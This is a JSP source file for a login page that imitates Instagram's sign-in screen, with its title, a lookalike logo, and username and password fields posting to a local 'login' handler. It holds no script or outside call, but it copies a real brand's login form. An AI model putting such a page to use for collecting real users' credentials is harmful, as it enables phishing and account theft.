<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Instagram — Login</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
  <div class="center-wrapper">
    <div class="login-card">
      <div class="logo">
        <!-- simple SVG Instagram-like logo -->
        <img src="images/insta_logo.svg" alt="logo" />
      </div>
      <form action="login" method="post" class="login-form">
        <input type="text" name="username" placeholder="Phone number, username or email" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit" class="login-btn">Log In</button>
      </form>

      <div class="or">OR</div>

      <div class="facebook-login">
        <img src="images/fb_icon.svg" alt="fb" /> <span>Log in with Facebook</span>
      </div>

      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-card">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <div class="app-links">
      <p>Get the app.</p>
      <div class="stores">
        <img src="images/appstore.svg" alt="appstore" />
        <img src="images/playstore.svg" alt="playstore" />
      </div>
    </div>
  </div>
</body>
</html>
